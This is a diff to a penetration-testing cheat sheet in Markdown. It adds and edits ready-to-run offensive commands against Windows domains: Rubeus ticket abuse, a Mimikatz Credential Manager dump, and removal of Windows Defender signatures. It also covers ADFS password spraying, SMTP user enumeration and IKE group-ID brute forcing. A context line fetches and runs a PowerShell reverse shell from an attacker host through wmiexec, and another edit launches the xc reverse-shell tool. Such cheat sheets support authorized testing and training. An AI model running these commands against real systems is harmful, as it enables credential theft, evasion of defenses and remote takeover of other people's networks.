@@ -408,7 +408,7 @@ PS > .\Rubeus.exe s4u /domain:megacorp.local /user:fakemachine1337 /rc4:FC525C96
 PS > klist
 PS > cd \\DC01.megacorp.local\c$
 PS > ls
-PS > cd c:\
+PS > c:
 PS > Enter-PSSession -ComputerName DC01.megacorp.local
 PS > exit
 ```
@@ -1285,6 +1285,8 @@ Remove signatures (if Internet connection is present, they will be downloaded ag
 
 ```
 PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+Or
+Cmd > "%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
 Add path to exclusions:
@@ -2029,6 +2031,19 @@ PS > .\SharpDPAPI.exe machinetriage [/password:Passw0rd!]
 
 
 
+## Credential Manager
+
+
+
+### Mimikatz
+
+```
+Cmd > .\mimikatz.exe "privilege::debug" "vault::cred /patch" "exit"
+```
+
+
+
+
 
 # Engagement
 
@@ -2303,7 +2318,7 @@ PS > echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Wi
 PowerShell (option 2):
 
 ```
-PS > $NET="192.168.0";for($i=1;$i -lt 255;$i++){$command="ping -n 1 -w 100 $NET.$i > nul 2>&1 && echo $NET.$i";start-process -nonewwindow "cmd" -argumentlist "/c $command" -redirectstandardoutput "tmp$i.txt"};cat tmp*.txt > sweep.txt
+PS > $NET="192.168.0";for($i=1;$i -lt 255;$i++){$command="ping -n 1 -w 100 $NET.$i > nul 2>&1 && echo $NET.$i";start-process -nonewwindow cmd -argumentlist "/c $command" -redirectstandardoutput "tmp$i.txt"};cat tmp*.txt > sweep.txt
 PS > rm tmp*.txt
 ```
 
@@ -3127,7 +3142,7 @@ PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.We
 
 ```
 $ sudo apt install neo4j
-$ mkdir -p /usr/share/neo4j/logs/
+$ sudo mkdir -p /usr/share/neo4j/logs/
 $ sudo neo4j console
 ...change default password at localhost:7474...
 $ sudo neo4j start
@@ -3798,7 +3813,9 @@ Mix settings list (both for hardware install and virtualization):
 	* Disable kali user [VM]
 		SWITCH {
 			CASE (lock):
-				$ sudo usermod -L kali && usermod -s /sbin/nologin kali && chage -E0 kali
+				$ sudo usermod -L kali
+				$ sudo usermod -s /sbin/nologin kali
+				$ sudo chage -E0 kali
 			CASE (delete):
 				$ sudo userdel -r kali
 		}
@@ -3991,7 +4008,7 @@ PS > runas /netonly /user:snovvcrash powershell
 
 
 
-### evil-winrm.rb
+### Evil-WinRM
 
 * [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
@@ -4073,6 +4090,22 @@ Get a PowerShell reverse-shell:
 $ sudo python3 -m http.server 80
 $ sudo rlwrap nc -lvnp 443
 $ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
+```
+
+
+
+
+## Rubeus
+
+* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+* [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
+
+Create a sacrificial process, legitimately ask Kerberos for TGT and interact with the process:
+
+* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)
+
+```
+Cmd > .\Rubeus.exe asktgt /domain:megacorp.local /dc:dc1 /user:snovvcrash /password:Passw0rd! /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show
 ```
 
 
@@ -5026,6 +5059,16 @@ QUIT
 
 
 
+### RCPT
+
+* [https://github.com/z0mbiehunt3r/smtp-enum](https://github.com/z0mbiehunt3r/smtp-enum)
+
+```
+$ ./main.py -d megacorp.com -s 10.10.13.37 -f accounts.txt -m rcptto -o valid.txt
+```
+
+
+
 
 ## IPSec
 
@@ -5036,8 +5079,18 @@ QUIT
 * [https://xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
 * [https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
 * [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)
+* [https://github.com/SpiderLabs/ikeforce](https://github.com/SpiderLabs/ikeforce)
 
-Generate list of all transform-sets:
+
+#### Get Transform Set
+
+Using `ikeforce.py`:
+
+```
+$ sudo python ikeforce.py 10.10.13.37 -a
+```
+
+Using ike-scan via brute force. Generate list of all transform-sets:
 
 ```
 $ for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "$ENC,$HASH,$AUTH,$GROUP" >> trans-dict.txt; done; done; done; done
@@ -5046,36 +5099,46 @@ $ for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for
 Brute force supported transform-sets:
 
 ```
-$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M --trans=$t <IP>) |grep -B14 "1 returned handshake" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
+$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M --trans=$t 10.10.13.37) |grep -B14 "1 returned handshake" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
 Or (for aggressive mode)
-$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M -A -P'handshake.txt' -n FAKEID --trans=$t <IP>) |grep -B7 "SA=" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
+$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M -A -P'handshake.txt' -n FAKEID --trans=$t 10.10.13.37) |grep -B7 "SA=" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
 Or
-$ sudo python ikeforce.py -s1 -a <IP>  # -s1 for max speed
+$ sudo python ikeforce.py -s1 -a 10.10.13.37  # -s1 for max speed
 ```
+
+
+#### Get Vendor Info
 
 Get information about vendor:
 
 ```
-$ sudo ike-scan -M --showbackoff --trans=<TRANSFORM-SET> <IP>
+$ sudo ike-scan -M --showbackoff [--trans=<TRANSFORM-SET>] 10.10.13.37
 ```
+
+
+#### Test for Aggressive Mode
 
 Test for aggressive mode ON:
 
 ```
-$ sudo ike-scan -M -A -P -n FAKEID --trans=<TRANSFORM-SET> <IP>
+$ sudo ike-scan -M -A -P -n FAKEID [--trans=<TRANSFORM-SET>] 10.10.13.37
 ```
+
+
+#### Brute Force Group ID
 
 If no hash value is returned then brute force is (maybe also) possible:
 
 ```
-$ while read id; do (echo "[+] Valid ID: $id" && sudo ike-scan -M -A -n $id --trans=<TRANSFORM-SET> <IP>) | grep -B14 "1 returned handshake" | grep "Valid ID" |tee -a group-id.txt; done < dict.txt
+$ while read id; do (echo "[+] Valid ID: $id" && sudo ike-scan -M -A -n $id --trans=<TRANSFORM-SET> 10.10.13.37) | grep -B14 "1 returned handshake" | grep "Valid ID" |tee -a group-id.txt; done < dict.txt
 Or
-$ sudo python ikeforce.py <IP> -e -w wordlists/groupnames.dic t <TRANSFORM-SET-IN-SEPARATE-ARGS>
-
-Dicts:
-- /usr/share/seclists/Miscellaneous/ike-groupid.txt
-- ~/tools/ikeforce/wordlists/groupnames.dic
+$ sudo python ikeforce.py 10.10.13.37 -e -w wordlists/groupnames.dic -t <TRANSFORM-SET-IN-SEPARATE-ARGS>
 ```
+
+Dictionaries:
+
+* `/usr/share/seclists/Miscellaneous/ike-groupid.txt`
+* `~/tools/ikeforce/wordlists/groupnames.dic`
 
 
 
@@ -5274,6 +5337,28 @@ $ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dnt-l
 
 
 
+## ADFS
+
+
+
+#### ADFSpray
+
+* [https://github.com/xFreed0m/ADFSpray](https://github.com/xFreed0m/ADFSpray)
+
+Spray at autodiscover (NTLM auth) endpoint:
+
+```
+$ python3 ADFSpray.py -U users.txt -p 'Passw0rd!' -t 'https://autodiscover.megacorp.com/autodiscover/autodiscover.xml' autodiscover
+```
+
+
+#### adfsbrute
+
+* [https://github.com/ricardojoserf/adfsbrute](https://github.com/ricardojoserf/adfsbrute)
+
+
+
+
 ##  OWA
 
 
@@ -5315,17 +5400,6 @@ Notes:
 
 * In users.txt there's only "username" on a line, not "DOMAIN\username".
 * Errors like `ERROR: 04:27:43 brute.go:193: An error occured in connection - Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: net/http: request canceled` do **not** affect the current password probe.
-
-
-#### ADFSpray
-
-* [https://github.com/xFreed0m/ADFSpray](https://github.com/xFreed0m/ADFSpray)
-
-Spray at autodiscover (NTLM auth) endpoint:
-
-```
-$ python3 ADFSpray.py -U users.txt -p 'Passw0rd!' -t 'https://autodiscover.megacorp.com/autodiscover/autodiscover.xml' autodiscover
-```
 
 
 
@@ -6173,7 +6247,7 @@ $ rlwrap ./xc -l -p 443
 Launch:
 
 ```
-PS > Start-Process -NoNewWindow .\xc.exe 10.10.13.38 443
+PS > Start-Process -NoNewWindow .\xc.exe "10.10.13.38 443"
 ```
 
 
@@ -6181,6 +6255,7 @@ PS > Start-Process -NoNewWindow .\xc.exe 10.10.13.38 443
 ### Payload Generators
 
 * [http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)
+* [https://www.revshells.com/](https://www.revshells.com/)
 
 
 #### ShellPop
@@ -7820,7 +7895,8 @@ GitHub:
 
 * [Femida XSS](https://github.com/wish-i-was/femida)
 * [SHELLING](https://github.com/ewilded/shelling)
-* [https://burp-vulners-scanner](https://github.com/vulnersCom/burp-vulners-scanner)
+* [Burp Vulners Scanner](https://github.com/vulnersCom/burp-vulners-scanner)
+* [HackBar](https://github.com/d3vilbug/HackBar)
 
 
 
@@ -7898,7 +7974,7 @@ $ subfinder -all -config config.yaml -d hackerone.com -o subdomains.txt [-oI -nW
 
 ### shuffledns
 
-* [https://github.com/projectdiscovery/shuffledns/releases]https://github.com/projectdiscovery/shuffledns/releases)
+* [https://github.com/projectdiscovery/shuffledns/releases](https://github.com/projectdiscovery/shuffledns/releases)
 
 ```
 $ shuffledns -d hackerone.com -r /opt/dnsvalidator/resolvers.txt -w /usr/share/commonspeak2-wordlists/subdomains/subdomains.txt -o subdomains.txt -t 500
